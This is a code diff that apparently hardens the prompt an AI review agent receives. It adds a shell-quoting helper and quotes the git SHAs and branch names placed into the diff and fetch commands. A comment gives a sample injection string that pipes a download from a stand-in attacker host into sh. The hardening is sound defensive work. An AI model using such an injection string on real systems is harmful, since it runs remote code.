@@ -183,17 +183,41 @@ ${diff}
 `;
 }
 
+/** Single-quote a value so it can be interpolated safely into a POSIX sh
+ *  command. The result is always one inert shell word, even for hostile
+ *  inputs such as `x';curl evil.example|sh;'`. */
+export function shQuote(value: string): string {
+  return `'${value.replace(/'/g, "'\\''")}'`;
+}
+
 function buildAgenticDiffSection(args: AgenticDiffModeArgs): string {
-  const { baseSha, headSha, ignoredPaths } = args;
+  const { baseSha, headSha, baseRef, headRef, ignoredPaths } = args;
+  const qBaseSha = shQuote(baseSha);
+  const qHeadSha = shQuote(headSha);
+  const qBaseRef = shQuote(baseRef);
+  const qHeadRef = shQuote(headRef);
 
   return `# UNTRUSTED: How to obtain the diff
-Run the following command to see the changes in this PR:
+Your clone of the repository is shallow, so the merge base and the PR commits are probably not present locally yet. Follow these steps in order:
 
 \`\`\`bash
-git diff ${baseSha}...${headSha}
+git fetch --deepen=200 origin ${qBaseRef} ${qHeadRef}
+git diff ${qBaseSha}...${qHeadSha}
 \`\`\`
 
-If the SHA \`git diff\` command fails, fall back to inferring the base and head refs from your session context (e.g. \`git diff origin/<base-branch>...HEAD\`).
+If the \`git diff\` command fails (for example because a SHA is still missing from the clone), fall back to comparing the branches by name:
+
+\`\`\`bash
+git diff origin/${qBaseRef}...HEAD
+\`\`\`
+
+If that still fails with "no merge base", deepen the clone further and retry:
+
+\`\`\`bash
+git fetch --deepen=1000 origin ${qBaseRef} ${qHeadRef}
+# or, if the merge base is still missing:
+git fetch --unshallow origin
+\`\`\`
 ${
   ignoredPaths
     ? `
